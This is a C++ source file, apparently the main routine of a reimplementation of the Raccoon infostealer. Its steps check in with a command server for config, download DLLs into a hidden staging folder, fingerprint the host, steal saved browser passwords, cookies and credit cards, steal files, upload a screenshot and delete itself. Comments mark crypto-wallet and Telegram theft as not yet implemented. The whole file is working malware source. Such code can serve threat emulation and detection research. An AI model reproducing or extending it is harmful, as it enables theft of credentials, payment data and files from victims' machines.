#pragma once
#include "RaccoonInfostealer.h"

/**
* Main execution cycle of Raccoon. It's a one-shot deal,
* no additional back and forth C2.
* 
* We didn't implement a verbose option, so uncomment the prints
* below if you'd rather see what it's doing in real time vs. checking
* the server side.
*/

int main(int argc, char *argv[]) {
    int resultCode;

    ////// load DLLs and get addr of needed sys-native functions
    unordered_map<wstring, HMODULE> mModHandles;
    resultCode = loadModules(mModHandles);
    //cout << "Loading modules: " << resultCode << endl;
    resultCode = resolveFunctionPointers(mModHandles);
    //cout << "Resolving pointers: " << resultCode << endl;


    ////// Deobfuscate strings
    resultCode = debofuscateStrings();
    //cout << "Deobfuscating strings: " << resultCode << endl;


    ////// Set the mutex
    resultCode = createMutex();
    //cout << "Creating mutex: " << resultCode << endl;


    ////// Check for ru locale
    resultCode = checkLocale();
    //cout << "Checking locale: " << resultCode << endl;


    ////// Set the LocalLow folder path in the global variable
    setFolderPath();
    CreateDirectoryW(wstring(g_localLowPath + g_stagingFolder).c_str(), NULL);
    //cout << "Set the folder path" << endl;


    ////// Check for admin
    resultCode = isSystem();
    //cout << "Admin: " << resultCode << endl;
    

    ////// Get the config
    string rawConfig = conductInitialCheckin();
    //resultCode = rawConfig.empty()
    //cout << "Config is empty?: " << resultCode << endl;
    

    ////// Parse configuration from the server into a local hashmap
    unordered_map<wstring, vector<wstring>> config;
    resultCode = parseConfig(config, rawConfig);
    g_token = config[g_config_token][0];
    //cout << "Parsing config: " << resultCode << endl;
    

    ////// download DLLs to staging directory
    for (wstring lib : config[g_config_libs]) {
        wstring strippedLib = stripLib(lib);
        wstring filename = strippedLib.substr(strippedLib.find(g_forwardSlash));
        vector<char> contents = downloadFile(stripLib(lib));
        writeBytesToFile(contents, (g_localLowPath + g_stagingFolder + filename));
    }
    //cout << "Downloaded DLLs" << endl;


    ////// Basic fingerprinting and immediate exfil of the data
    resultCode = fingerprint();
    //cout << "Fingerprinting: " << resultCode << endl;


    ////// Use sqlite3.dll to retrieve credit card information, cookies and saved passwords by browser
    resultCode = browserTheft();
    //cout << "Looting browser data: " << resultCode << endl;


    // NOT IMPLEMENTED - Use mozglue3.dll to get logins.json, cookies, and histories from Firefox
    // NOT IMPLEMENTED - Search for Crypto wallets (cf.: `wlts_` and `ews_` and `wallets.dat`)


    ////// Generic file theft
    stealFiles(config[g_config_grbr]);
    //cout << "Tried to steal files, check the database" << endl;


    // NOT IMPLEMENTED - Telegram Desktop cache theft


    ////// Take and send Screenshot
    resultCode = takeScreenshot(g_localLowPath + g_stagingFolder + g_ScreenshotPath);
    // cout << "Screenshot: " << resultCode << endl;
    vector<char> bytes = readBytesFromFile((g_localLowPath + g_stagingFolder + g_ScreenshotPath));
    resultCode = sendMultipartUpload(bytes, g_screenshotUploadName, g_token);
    //cout << "Screenshot uploaded: " << resultCode << endl;
    

    ////// cleanup
    resultCode = cleanup(mModHandles);
    //cout << "Cleanup (1 is good this time): " << resultCode << endl;
    

    ////// Write the self deleting batch file to disk
    resultCode = initiateSelfDelete();
    // Sometimes these lines don't print - terminates before the print
    //cout << "Self delete bat created, process started (1 is good this time): " << resultCode << endl;
    //cout << "Note -- check the exe is gone, won't happen til I die in a sec :')" << endl;

    return 0;
}